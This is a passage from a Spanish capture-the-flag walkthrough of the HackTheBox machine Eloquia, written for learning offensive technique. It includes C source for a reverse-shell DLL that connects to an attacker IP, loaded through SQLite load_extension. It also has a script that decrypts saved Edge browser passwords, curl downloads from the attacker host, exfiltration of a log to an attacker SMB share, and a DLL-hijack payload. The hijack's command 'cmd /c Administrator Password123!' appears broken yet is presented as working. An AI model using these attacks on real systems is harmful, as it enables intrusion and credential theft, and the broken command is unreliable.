typedef struct sqlite3_api_routines sqlite3_api_routines;

__declspec(dllexport) int sqlite3_extension_init(
    sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi)
{
    (void)db; (void)pzErrMsg; (void)pApi;

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 0;

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return 0; }

    SetHandleInformation((HANDLE)s, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    struct sockaddr_in addr = { 0 };
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(443);
    addr.sin_addr.s_addr = inet_addr("10.10.15.242");

    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        closesocket(s); WSACleanup();
        return 0;
    }

    STARTUPINFOA si = { 0 };
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdInput   = si.hStdOutput = si.hStdError = (HANDLE)s;

    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
```

Compilaremos esta nueva DLL usando las flags `-lws2_32` para enlazar winsock y `-s` para eliminar símbolos

``` bash
x86_64-w64-mingw32-gcc -shared -o shell.dll evil.c -lws2_32 -s
```

Volveremos a crear un artículo, esta vez cargaremos la DLL que ejecuta una reverse shell hacia nuestra IP

![image-center](/assets/images/posts/eloquia-56-hackthebox.png)
{: .align-center}

### Trigger

Antes de iniciar la ejecución del lado del servidor, iniciaremos un listener con `netcat` para recibir la conexión

``` bash
rlwrap nc -lvnp 443
```

## Shell as `web`

Ahora que tenemos todo preparado, desde el `SQL Explorer` cargaremos la DLL almacenada en el servidor para iniciar la ejecución

``` sql
SELECT load_extension('static/assets/images/blog/shell.dll');
```

En un momento recibiremos una consola como el usuario `web`

``` bash
Connection from 10.129.134.175:52794
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Web\Eloquia>whoami
whoami
eloquia\web
```

Ya podremos ver la flag del usuario sin privilegios

``` bash
C:\ProgramData>type C:\Users\Web\Desktop\user.txt
type C:\Users\Web\Desktop\user.txt
eb9...
```
<br>


# Escalada de Privilegios
---
## System Enumeration

Ya que estamos dentro, comenzaremos a enumerar el sistema en búsquedas de vías para escalar privilegios

``` powershell
C:\Web\Eloquia>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::7bb6:eece:5394:3913
   Link-local IPv6 Address . . . . . : fe80::d9f4:d640:85d1:f3fc%18
   IPv4 Address. . . . . . . . . . . : 10.129.134.175
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:70fa%18
                                       10.129.0.1
```

### Current User

En cuanto al usuario actual, no parece tener privilegios o membresías fuera de lo común

``` powershell
C:\Web\Eloquia>whoami /all
whoami /all

USER INFORMATION
----------------

User Name   SID                                          
=========== =============================================
eloquia\web S-1-5-21-1842486011-416502281-2506894253-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### AppLocker

Si intentamos migrar a una `powershell` el sistema nos bloqueará

``` powershell
C:\Web\Eloquia>powershell
powershell
This program is blocked by group policy. For more information, contact your system administrator.
```

Con este mensaje podemos confirmar que `AppLocker` nos está bloqueando

![image-center](/assets/images/posts/eloquia-57-hackthebox.png)
{: .align-center}

Podemos consultar las reglas de AppLocker con el siguiente comando, filtrando por nuestro usuario. En este caso bastará con ver el registro `Exe`

``` powershell
C:\Web\Eloquia>reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe" /s | findstr 1000

reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe" /s | findstr 1000
    Value    REG_SZ    <FilePublisherRule Id="47de4b35-139d-4c63-86fb-4650d6ed506c" Name="POWERSHELL.EXE, in MICROSOFTr WINDOWSr OPERATING SYSTEM, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-5-21-1842486011-416502281-2506894253-1000" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="POWERSHELL.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>
```

Existe un regla aplicada al usuario con el RID `1000` (el usuario `web`) que deniega la ejecución de `powersell.exe`

``` xml
<FilePublisherRule Id="47de4b35-139d-4c63-86fb-4650d6ed506c" Name="POWERSHELL.EXE, in MICROSOFTr WINDOWSr OPERATING SYSTEM, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-5-21-1842486011-416502281-2506894253-1000" Action="Deny">
	<Conditions>
		<FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="POWERSHELL.EXE">
			<BinaryVersionRange LowSection="*" HighSection="*"/>
		</FilePublisherCondition>
	</Conditions>
</FilePublisherRule
```

### Users

Veremos que existe un usuario llamado `Olivia.KAT` además de `web`. Probablemente debamos movernos lateralmente a ese usuario antes de conseguir privilegios máximos

``` powershell
C:\Web\Eloquia>net user
net user

User accounts for \\ELOQUIA

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Olivia.KAT               WDAGUtilityAccount       web                      
The command completed successfully.


C:\Web\Eloquia>dir C:\Users
dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users

04/20/2024  11:50 AM    <DIR>          .
04/20/2024  11:50 AM    <DIR>          ..
11/28/2025  11:21 AM    <DIR>          Administrator
04/20/2024  11:50 AM    <DIR>          Olivia.KAT
04/15/2024  09:26 PM    <DIR>          Public
10/22/2025  01:31 PM    <DIR>          web
               0 File(s)              0 bytes
               6 Dir(s)   5,431,697,408 bytes free

```

El usuario `olivia.kat` es miembro del grupo `Remote Management Users`, por lo que si obtenemos sus credenciales, podremos conectarnos vía WinRM

``` powershell
C:\Web\Eloquia> net user olivia.kat
User name                    Olivia.KAT
Full Name                    Olivia.KAT
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/20/2024 11:49:00 AM
Password expires             Never
Password changeable          4/20/2024 11:49:00 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/20/2026 4:02:31 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.
```

### Processes

Listando los procesos, veremos uno llamado `Failure2Ban.exe`

``` powershell
C:\Web\Eloquia>tasklist
tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0                            0          8 K
System                           4                            0        156 K
Registry                        88                            0     21,104 K
smss.exe                       288                            0      1,128 K
csrss.exe                      380                            0      5,644 K
wininit.exe                    488                            0      7,008 K
csrss.exe                      496                            1      4,816 K
winlogon.exe                   560                            1     17,460 K
services.exe                   632                            0      9,968 K
lsass.exe                      640                            0     16,612 K
svchost.exe                    752                            0      4,024 K
svchost.exe                    776                            0     15,272 K
fontdrvhost.exe                796                            1      4,848 K
fontdrvhost.exe                804                            0      4,708 K
svchost.exe                    884                            0     11,484 K
svchost.exe                    928                            0      7,348 K
svchost.exe                    976                            0     10,656 K
svchost.exe                     64                            0      8,500 K
dwm.exe                        368                            1     44,576 K
svchost.exe                    696                            0      5,628 K
svchost.exe                    944                            0      8,520 K
svchost.exe                   1004                            0      6,228 K
svchost.exe                   1136                            0      5,908 K
svchost.exe                   1144                            0     16,196 K
svchost.exe                   1232                            0      7,976 K
svchost.exe                   1244                            0     12,404 K
svchost.exe                   1256                            0      9,184 K
svchost.exe                   1280                            0      5,868 K
svchost.exe                   1308                            0      7,564 K
svchost.exe                   1360                            0      7,908 K
svchost.exe                   1408                            0      6,092 K
svchost.exe                   1444                            0     15,552 K
svchost.exe                   1496                            0     11,788 K
svchost.exe                   1504                            0      8,724 K
svchost.exe                   1512                            0      9,188 K
svchost.exe                   1684                            0      8,388 K
svchost.exe                   1712                            0     10,700 K
svchost.exe                   1756                            0      8,972 K
svchost.exe                   1840                            0      7,456 K
svchost.exe                   1864                            0      7,504 K
svchost.exe                   1900                            0     18,388 K
svchost.exe                   1960                            0      8,552 K
svchost.exe                   1596                            0      8,636 K
spoolsv.exe                   2128                            0     17,100 K
svchost.exe                   2200                            0     11,284 K
svchost.exe                   2208                            0     32,532 K
svchost.exe                   2220                            0      8,052 K
svchost.exe                   2236                            0     23,452 K
MpDefenderCoreService.exe     2304                            0     18,252 K
svchost.exe                   2320                            0      6,816 K
svchost.exe                   2332                            0      8,668 K
svchost.exe                   2352                            0      6,568 K
svchost.exe                   2408                            0      5,756 K
VGAuthService.exe             2432                            0     10,704 K
vm3dservice.exe               2460                            0      6,204 K
svchost.exe                   2480                            0     12,396 K
svchost.exe                   2488                            0     12,052 K
vmtoolsd.exe                  2496                            0     22,800 K
svchost.exe                   2516                            0      7,648 K
MsMpEng.exe                   2552                            0    335,508 K
svchost.exe                   2596                            0     11,124 K
svchost.exe                   2652                            0     13,272 K
vm3dservice.exe               2804                            1      6,944 K
svchost.exe                   2968                            0     12,620 K
svchost.exe                   3208                            0      7,632 K
dllhost.exe                   3440                            0     11,316 K
dllhost.exe                   3608                            0     13,784 K
WmiPrvSE.exe                  3892                            0     36,700 K
LogonUI.exe                   4076                            1     48,836 K
msdtc.exe                     4060                            0     10,628 K
NisSrv.exe                    4440                            0     11,636 K
svchost.exe                   4540                            0     22,720 K
cmd.exe                       3300                            0        560 K
conhost.exe                   4252                            0      1,444 K
python.exe                    3556                            0      4,264 K
cmd.exe                       5168                            0        560 K
conhost.exe                   5176                            0      2,152 K
python.exe                    5232                            0      2,628 K
python.exe                    5288                            0      4,236 K
python.exe                    5308                            0      4,700 K
python.exe                    5320                            0     21,732 K
python.exe                    5328                            0      4,268 K
python.exe                    5336                            0      4,240 K
python.exe                    5360                            0      4,276 K
python.exe                    5376                            0      4,264 K
python.exe                    5384                            0      4,280 K
svchost.exe                   1180                            0     12,640 K
svchost.exe                   1108                            0     18,512 K
MicrosoftEdgeUpdate.exe       4500                            0      3,844 K
svchost.exe                   5536                            0     14,824 K
w3wp.exe                      3672                            0     19,588 K
svchost.exe                   5896                            0     10,428 K
svchost.exe                   6056                            0      7,840 K
SecurityHealthService.exe     5116                            0     12,268 K
cmd.exe                       4732                            0      4,180 K
svchost.exe                   5652                            0     12,808 K
svchost.exe                   3616                            0      6,412 K
dllhost.exe                   1336                            0      6,256 K
Failure2Ban.exe               2816                            0     14,884 K
tasklist.exe                  4852                            0      7,948 K
```

### Failure2Ban

Este proceso claramente no es nativo de Windows, listando carpetas notaremos que parece un proyecto personalizado

``` powershell
C:\Web\Eloquia>dir "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban"
dir "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban"
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban

05/01/2024  08:53 PM    <DIR>          .
05/01/2024  08:53 PM    <DIR>          ..
04/25/2024  11:32 AM               273 App.config
04/30/2024  01:37 PM    <DIR>          bin
04/25/2024  11:20 AM             3,828 Failure2Ban.csproj
04/30/2024  01:33 PM    <DIR>          obj
04/25/2024  11:12 AM               589 Program.cs
04/23/2024  05:48 AM               446 ProjectInstaller.cs
04/23/2024  05:51 AM             1,914 ProjectInstaller.Designer.cs
04/23/2024  05:48 AM             6,416 ProjectInstaller.resx
04/30/2024  01:33 PM    <DIR>          Properties
04/30/2024  01:33 PM    <DIR>          Service References
05/01/2024  07:48 AM             6,680 Service1.cs
04/23/2024  05:18 AM             1,106 Service1.Designer.cs
               8 File(s)         21,252 bytes
               6 Dir(s)   5,431,054,336 bytes free
```


## Extracting Web Browser Stored Credentials

Durante la enumeración, identificaremos secretos DPAPI almancenados

``` powershell
C:\Web\Eloquia>dir /a C:\Users\web\AppData\Roaming\Microsoft\Protect

dir /a C:\Users\web\AppData\Roaming\Microsoft\Protect
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Roaming\Microsoft\Protect

04/19/2024  05:53 PM    <DIR>          .
04/19/2024  05:53 PM    <DIR>          ..
04/19/2024  05:53 PM                24 CREDHIST
10/18/2026  09:26 AM    <DIR>          S-1-5-21-1842486011-416502281-2506894253-1000
               1 File(s)             24 bytes
               3 Dir(s)   5,429,407,744 bytes free
               

C:\Web\Eloquia>dir /a C:\Users\web\AppData\Roaming\Microsoft\Protect\S-1-5-21-1842486011-416502281-2506894253-1000

dir /a C:\Users\web\AppData\Roaming\Microsoft\Protect\S-1-5-21-1842486011-416502281-2506894253-1000
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Roaming\Microsoft\Protect\S-1-5-21-1842486011-416502281-2506894253-1000

10/18/2026  09:26 AM    <DIR>          .
10/18/2026  09:26 AM    <DIR>          ..
04/19/2024  05:53 PM               468 1fb8f70f-47eb-4349-9bd6-1d127f39a89e
04/20/2025  12:29 PM               468 592ac9cb-c0d7-441e-b163-ba9d07c6e1fd
10/18/2026  09:26 AM               468 60b74820-1e86-4a8f-9dca-c739a509d949
10/21/2025  02:23 PM               468 908daf73-20f9-47e0-bf1a-e80eb1eb3f84
10/18/2026  09:26 AM                24 Preferred
               5 File(s)          1,896 bytes
               2 Dir(s)   5,429,403,648 bytes free
```

Hay varios secretos DPAPI. Sin embargo, no parece haber credential blobs

``` powershell
C:\Web\Eloquia>dir /a C:\Users\web\AppData\Roaming\Microsoft\Credentials

dir /a C:\Users\web\AppData\Roaming\Microsoft\Credentials
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Roaming\Microsoft\Credentials

04/19/2024  05:53 PM    <DIR>          .
04/19/2024  05:53 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)   5,429,403,648 bytes free
```

Lo que si encontraremos será el archivo `Login Data`, que almacena credenciales del navegador.

> Microsoft Edge almacena las credenciales de los usuarios encriptadas en archivos locales de Windows mediante el sistema DPAPI (`Data Protection API`).
{: .notice--info}

``` powershell
C:\ProgramData>dir "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"

dir "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default

10/22/2025  10:54 AM            51,200 Login Data
               1 File(s)         51,200 bytes
               0 Dir(s)   5,188,595,712 bytes free
```

> `Login Data` una base de datos basada en SQLite que utilizan navegadores web (como Google Chrome o Microsoft Edge) instalados en Windows para almacenar los nombres de usuario y contraseñas guardados.
{: .notice--info}

Como esta base de datos está cifrada con DPAPI, al igual que con los credential blobs, necesitaremos descifrar esta base de datos usando una `Master Key`. Este archivo normalmente se encuentra en:

``` powershell
C:\Users\$USER\AppData\Local\Microsoft\Edge\User Data\Local State
```

### Decrypt

> El problema ahora es que la clave maestra se almacena cifrada mediante DPAPI en el estado local. Por lo que está vinculada al usuario que tiene la sesión iniciada.
{: .notice--danger}

El siguiente script automatiza el proceso y muestra las credenciales en texto plano

``` python
import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

# --- 1. Decrypt the master key using DPAPI ---
def get_master_key():
    # Typical path for Edge's default profile
    local_state_path = os.path.join(
        os.environ['LOCALAPPDATA'],
        'Microsoft', 'Edge', 'User Data', 'Local State'
    )
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)

    # The key is base64-encoded and prefixed with "DPAPI"
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    # Strip the first 5 bytes ("DPAPI" string)
    encrypted_key = encrypted_key[5:]
    # Decrypt using Windows DPAPI
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

# --- 2. Decrypt each password with AES-GCM ---
def decrypt_password(ciphertext, master_key):
    try:
        # Blob structure: "v10" (3 bytes) + Nonce (12 bytes) + Ciphertext + Tag (16 bytes)
        iv = ciphertext[3:15]
        payload = ciphertext[15:-16]
        tag = ciphertext[-16:]
        # Build AES-GCM cipher
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        # Decrypt and verify authentication tag
        decrypted_pass = cipher.decrypt_and_verify(payload, tag)
        return decrypted_pass.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"[!] Decryption error: {e}"

# --- 3. Extract and decrypt from the SQLite database ---
def extract_credentials(master_key):
    login_db = os.path.join(
        os.environ['LOCALAPPDATA'],
        'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'
    )
    # Copy the DB to avoid locks if Edge is running
    shutil.copy2(login_db, "Login Data_copy")
    
    conn = sqlite3.connect("Login Data_copy")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    for url, user, encrypted_pass in cursor.fetchall():
        if user and encrypted_pass:
            decrypted = decrypt_password(encrypted_pass, master_key)
            print(f"URL: {url}\nUsername: {user}\nPassword: {decrypted}\n{'-'*40}")
    
    conn.close()
    os.remove("Login Data_copy")

if __name__ == "__main__":
    key = get_master_key()
    extract_credentials(key)
```

Podemos verificar rápidamente si la máquina tiene instalado `python3`

``` powershell
C:\Web\Eloquia>dir "C:\Program Files"
dir "C:\Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Program Files

10/11/2025  04:07 AM    <DIR>          .
10/11/2025  04:07 AM    <DIR>          ..
11/06/2025  02:41 PM    <DIR>          Automation Scripts
09/08/2025  12:04 AM    <DIR>          Common Files
10/08/2025  05:23 AM    <DIR>          IIS
11/28/2025  08:16 AM    <DIR>          internet explorer
04/16/2024  08:53 AM    <DIR>          Python311
04/30/2024  01:40 PM    <DIR>          Qooqle IPS Software
10/08/2025  05:22 AM    <DIR>          Reference Assemblies
09/08/2025  12:05 AM    <DIR>          VMware
05/04/2024  09:32 AM    <DIR>          Windows Defender
11/28/2025  08:16 AM    <DIR>          Windows Defender Advanced Threat Protection
11/05/2022  12:03 PM    <DIR>          Windows Mail
04/26/2025  11:30 PM    <DIR>          Windows Media Player
11/28/2025  08:16 AM    <DIR>          Windows Multimedia Platform
09/15/2018  12:28 AM    <DIR>          windows nt
11/05/2022  12:03 PM    <DIR>          Windows Photo Viewer
11/28/2025  08:16 AM    <DIR>          Windows Portable Devices
09/15/2018  12:19 AM    <DIR>          Windows Security
09/15/2018  12:19 AM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              20 Dir(s)   5,417,377,792 bytes free
```

Existe el directorio en `Program Files`, eso es buena noticia.

Descargaremos el script en la máquina víctima y lo lanzaremos para descifrar la base de datos y ver las credenciales.

``` powershell
C:\Web\Eloquia>curl http://10.10.15.242/decrypt.py -o C:\ProgramData\decrypt.py # download

C:\Web\Eloquia>"C:\Program Files\Python311\python.exe" C:\ProgramData\decrypt.py

"C:\Program Files\Python311\python.exe" C:\ProgramData\decrypt.py
URL: https://openai.com/
Username: olivia.kat
Password: [!] Decryption error: MAC check failed
----------------------------------------
URL: http://eloquia.htb/accounts/login/
Username: Olivia.KAT
Password: S3cureP@sswdIGu3ss
----------------------------------------
URL: https://eloquia.htb/
Username: test
Password: testtest1234!
----------------------------------------
URL: https://chatgpt.com/
Username: olivia.kat
Password: S3cureP@sswd3Openai
----------------------------------------
```


## Shell as `Olivia.KAT`

Podemos validar la contraseña de `olivia` con herramientas como `netexec` (a menos que seas un chad y te conectes directamente)

``` powershell
nxc winrm "$TARGET_IP" -u olivia.kat -p 'S3cureP@sswdIGu3ss'      
WINRM       10.129.136.52   5985   ELOQUIA          [*] Windows 10 / Server 2019 Build 17763 (name:ELOQUIA) (domain:Eloquia) 
WINRM       10.129.136.52   5985   ELOQUIA          [+] Eloquia\olivia.kat:S3cureP@sswdIGu3ss (admin)
```

Utilizaremos herramientas como `evil-winrm-py` para iniciar una sesión remota de `powershell`

``` bash
evil-winrm-py -i "$TARGET_IP" -u Olivia.KAT -p 'S3cureP@sswdIGu3ss'                          
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'eloquia.htb:5985' as 'Olivia.KAT'
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> whoami
eloquia\olivia.kat
```


## More System Enumeration

Antes de lanzar herramientas de enumeración siempre podemos iniciar este proceso con algunas verificaciones manuales.

En este caso notaremos que existe un acceso directo llamado `Failure2Ban - Prototype - Shortcut.lnk`, que por su nombre probablemente sea el proyecto que vimos antes, además de un archivo `Logfile.PML` y un archivo `Todo.txt`

> Un archivo `Logfile.PML` es un registro de datos generado por Process Monitor (`Procmon`), una herramienta gratuita de Microsoft Sysinternals para Windows.
{: .notice--info}

``` bash
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> dir ../Desktop


    Directory: C:\Users\Olivia.KAT\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        4/30/2024   1:53 PM           1558 Failure2Ban - Prototype - Shortcut.lnk                                 
-a----         5/6/2024   2:00 PM        1331957 Logfile.PML                                                            
-a----        4/22/2024   7:02 AM            362 Todo.txt
```

El archivo `Todo.txt` contiene una nota:

``` powershell
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> type ..\Desktop\Todo.txt
[X] implement App.config file
[X] implement file type filtering
[] read firewall rules on service start
[] implement malicious input detection algorithm
[] avoid reading the whole "log" file on every service recall
-------------------------------
Problem: service is eating the CPU at huge log file size
Solution(temporary): Log rotation & service restart
```

Esta nota sugiere una tarea programada, aunque no tenemos permisos

``` powershell
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> Get-ScheduledTask
Cannot connect to CIM server. Access denied 
```

### Procmon

Podemos analizar el archivo de Procmon desde Linux, en mi csao usé un recurso compartido por SMB

``` powershell
# attacker
smbserver.py -smb2support share . -username incommatose -password asdsa


evil-winrm-py PS C:\Users\Olivia.KAT\Documents> net use \\10.10.15.242\share /user:incommatose asdsa
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> copy ..\Desktop\Logfile.PML \\10.10.15.242\share
```

Herramientas como `procmon-parser` nos pueden ayudar a leer el log

``` bash
uv venv
source .venv/bin/activate
uv pip install uv pip install procmon-parser 
```

En mi caso utilicé el siguiente script de Python

``` python
from procmon_parser import ProcmonLogsReader

f = open('Logfile.PML', 'rb')
pml_reader = ProcmonLogsReader(f)

for event in pml_reader:
    print(event)
```

Ahora ejecutaremos el script para dumpear los logs de Procmon

``` bash
uv run proc.py | grep Failure2Ban.exe
```


## DLL Hijack

Dentro de las primeras cien líneas veremos un comportamiento interesante. Process Monitor registró un intento de acceso a una DLL llamada `VERSION.dll`, que se ubica en el directorio del proyecto

``` bash
<SNIP>

Process Name=Failure2Ban.exe, Pid=1880, Operation=CreateFile, Path="C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\VERSION.dll", Time=5/6/2024 3:34:06.3410771 AM
Process Name=Failure2Ban.exe, Pid=1880, Operation=CreateFile, Path="C:\Windows\SysWOW64\version.dll", Time=5/6/2024 3:34:06.3416034 AM
Process Name=Failure2Ban.exe, Pid=1880, Operation=QueryBasicInformationFile, Path="C:\Windows\SysWOW64\version.dll", Time=5/6/2024 3:34:06.3416542 AM
Process Name=Failure2Ban.exe, Pid=1880, Operation=CloseFile, Path="C:\Windows\SysWOW64\version.dll", Time=5/6/2024 3:34:06.3416721 AM
Process Name=Failure2Ban.exe, Pid=1880, Operation=CreateFile, Path="C:\Windows\SysWOW64\version.dll", Time=5/6/2024 3:34:06.3418456 AM
Process Name=Failure2Ban.exe, Pid=1880, Operation=CreateFileMapping, Path="C:\Windows\SysWOW64\version.dll", Time=5/6/2024 3:34:06.3419687 AM
Process Name=Failure2Ban.exe, Pid=1880, Operation=CreateFileMapping, Path="C:\Windows\SysWOW64\version.dll", Time=5/6/2024 3:34:06.3420301 AM
Process Name=Failure2Ban.exe, Pid=1880, Operation=CloseFile, Path="C:\Windows\SysWOW64\version.dll", Time=5/6/2024 3:34:06.3433788 AM

<SNIP>
```

Sin embargo, esta DLL no existe actualmente

``` powershell
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> dir "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\VERSION.dll"
Cannot find path 'C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\VERSION.dll' because it does not exist.
```

Luego de intentar acceder a `VERSION.dll`, accede a `C:\Windows\SysWOW64\version.dll`

> `version.dll` es un archivo de biblioteca de vínculos dinámicos (DLL) del sistema operativo Windows que contiene funciones de la API encargadas de verificar y leer la información de versión de los archivos ejecutables y del propio sistema. 
{: .notice--info}

Esto nos puede estar sugiriendo un vector de DLL Hijacking, confirmaremos con revisar los permisos dentro de la carpeta `Debug`

``` powershell
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug"
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug ELOQUIA\Olivia.KAT:(I)(OI)(CI)(RX,W)
                                                                                   NT SERVICE\TrustedInstaller:(I)(F)
                                                                                   NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                                                                   NT AUTHORITY\SYSTEM:(I)(F)
                                                                                   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                                                                   BUILTIN\Administrators:(I)(F)
                                                                                   BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                                                   BUILTIN\Users:(I)(RX)
                                                                                   BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                                                                   CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                                                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                                                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                                                                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

`Olivia.kat` tiene permisos de escritura en el directorio del proyecto, podríamos intentar alojar una DLL maliciosa y esperar a que se ejecute

``` c
#include <windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
    if (fdwReason == DLL_PROCESS_ATTACH) {
      system("cmd /c Administrator Password123!");
    }
    
    return TRUE;
}
```

Ahora compilaremos nuestra DLL maliciosa

``` bash
i686-w64-mingw32-gcc -shared -o version.dll version.c -lws2_32
```

Ahora descargaremos y copiaremos la DLL al directorio `Debug` del proyecto

``` powershell
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> curl http://10.10.15.242/VERSION.dll -o C:\ProgramData\VERSION.dll

evil-winrm-py PS C:\Users\Olivia.KAT\Documents> copy C:\ProgramData\VERSION.dll "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bi
n\Debug"
```

Esperaremos la siguiente ejecución y verificaremos que se haya ejecutado el comando

``` bash
nxc winrm "$TARGET_IP" -u Administrator -p 'Password123!'       
